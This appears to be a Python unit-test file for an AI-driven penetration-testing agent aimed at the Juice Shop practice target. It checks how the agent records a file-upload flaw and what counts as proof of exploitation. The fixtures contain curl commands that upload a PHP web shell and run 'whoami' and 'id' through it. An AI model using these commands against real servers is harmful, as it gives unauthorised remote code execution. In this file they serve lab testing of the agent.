import os
import tempfile
import unittest
from pathlib import Path


def _import_dynamic_agent():
    import sys
    here = Path(__file__).resolve()
    repo = here.parents[2]
    oi_dir = repo / "kali-executor" / "open-interpreter"
    sys.path.insert(0, str(oi_dir))
    import dynamic_agent  # type: ignore
    return dynamic_agent


class TestFileUploadProofGate(unittest.TestCase):
    def setUp(self):
        self.da = _import_dynamic_agent()
        self.tmpdir_obj = tempfile.TemporaryDirectory()
        self.tmpdir = self.tmpdir_obj.name

        self._old_env = dict(os.environ)
        os.environ["ENFORCE_EXPLOITATION_PROOF"] = "true"

        self.agent = self.da.DynamicAgent(log_dir=self.tmpdir, llm_provider=None, max_iterations=1)
        self.agent.target = "juiceshop"

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self._old_env)
        self.tmpdir_obj.cleanup()

    def _exec(self, content, stdout="", stderr="", success=True, tool_used="curl"):
        Execution = self.da.Execution
        return Execution(
            timestamp="2026-02-06T00:00:00Z",
            iteration=1,
            execution_type="command",
            content=content,
            stdout=stdout,
            stderr=stderr,
            exit_code=0 if success else 1,
            duration_ms=10,
            success=success,
            tool_used=tool_used,
        )

    def test_auto_tracks_risky_file_upload(self):
        ex = self._exec(
            'curl -s -X POST "http://juiceshop:3000/file-upload" -F "file=@/tmp/shell.php"',
            stdout='{"status":"success","file":"shell.php"}',
        )
        self.agent._auto_track_vulns_from_execution(ex)
        self.assertIn("file_upload_juiceshop", self.agent.vulns_found)

    def test_file_upload_proof_requires_uid(self):
        v = {"type": "file upload", "target": "juiceshop"}
        ex = self._exec(
            'curl -s "http://juiceshop:3000/ftp/uploads/shell.php?cmd=whoami"',
            stdout="www-data\n",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertFalse(ok)

        ex2 = self._exec(
            'curl -s "http://juiceshop:3000/ftp/uploads/shell.php?cmd=id"',
            stdout="uid=33(www-data) gid=33(www-data) groups=33(www-data)\n",
        )
        ok2, _ = self.agent._proof_ok_for_vuln(v, ex2)
        self.assertTrue(ok2)


if __name__ == "__main__":
    unittest.main()

